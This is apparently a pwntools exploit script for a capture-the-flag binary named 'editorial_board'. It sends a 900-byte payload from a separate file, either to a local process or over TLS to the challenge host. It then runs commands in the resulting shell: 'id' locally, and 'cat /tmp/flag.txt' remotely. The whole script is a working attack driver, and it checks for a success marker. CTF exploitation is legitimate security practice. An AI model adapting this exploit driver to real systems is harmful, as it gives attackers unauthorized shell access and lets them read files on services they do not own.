#!/usr/bin/env python3
from pathlib import Path

from pwn import *

context.arch = "i386"
context.log_level = "info"

HERE = Path(__file__).resolve().parent
CHALLENGE = HERE.parent
exe = ELF("./editorial_board", checksec=False)
HOST = args.HOST or "editorial-board-2391138a0f27.inst2.ctf.fortid.com"
PORT = int(args.PORT or 1337)
LOCAL = bool(args.LOCAL)

payload = (HERE / "payload.txt").read_bytes()
if len(payload) != 900:
    raise SystemExit(f"expected a 900-byte payload, got {len(payload)}")

if LOCAL:
    p = process([exe.path])
else:
    p = remote(HOST, PORT, ssl=True)
p.timeout = 60

p.recvuntil(b"Submit your manuscript:")
p.sendline(payload)
if LOCAL:
    p.sendline(b"echo LOCAL_SHELL_OK; id; exit")
else:
    p.sendline(b"cat /tmp/flag.txt; exit")

result = p.recvall(timeout=60)
print(result.decode("latin1", errors="replace"))
expected = b"LOCAL_SHELL_OK" if LOCAL else b"FortID{"
if expected not in result:
    raise SystemExit(f"missing success marker: {expected.decode()}")
